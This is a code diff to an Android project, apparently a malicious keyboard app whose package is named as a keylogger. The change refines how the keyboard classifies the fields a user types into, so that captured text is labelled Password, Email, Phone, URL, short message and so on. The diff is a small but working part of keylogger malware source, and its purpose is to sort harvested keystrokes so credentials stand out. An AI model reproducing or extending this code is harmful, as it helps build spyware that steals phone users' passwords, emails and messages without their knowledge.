@@ -2,6 +2,7 @@ package com.example.keyboard_keylogger.evil;
 
 import android.inputmethodservice.InputMethodService;
 import android.provider.Settings;
+import android.text.InputType;
 import android.view.inputmethod.InputConnection;
 
 import androidx.annotation.NonNull;
@@ -80,8 +81,25 @@ public class InformationManager {
     }
     @NonNull
     private String determineInputType(int inputType){
-        if (InputTypeUtils.isPasswordInputType(inputType) || InputTypeUtils.isVisiblePasswordInputType(inputType)) return "Password";
-        if (InputTypeUtils.isEmailVariation(inputType)) return "Email";
+        int variation = inputType & InputType.TYPE_MASK_VARIATION;
+        int inputClass = inputType & InputType.TYPE_MASK_CLASS;
+
+        switch (inputClass){
+            case InputType.TYPE_CLASS_NUMBER: return "Number";
+            case InputType.TYPE_CLASS_DATETIME: return "Date";
+            case InputType.TYPE_CLASS_PHONE: return "Phone";
+            case InputType.TYPE_CLASS_TEXT:
+                if(InputTypeUtils.isEmailVariation(variation)){
+                    return "Email";
+                }
+                else if (InputTypeUtils.isPasswordInputType(inputType) || InputTypeUtils.isVisiblePasswordInputType(inputType)) return "Password";
+                else if(variation==InputType.TYPE_TEXT_VARIATION_URI) return "URL";
+                else if(variation==InputType.TYPE_TEXT_VARIATION_SHORT_MESSAGE) return "SM";
+                else if(variation==InputType.TYPE_TEXT_VARIATION_FILTER) return "Text";
+                else return "Text";
+        }
+
+
         return "Text";
     }
     public void extractAllTextFromInputField(InputConnection ic){
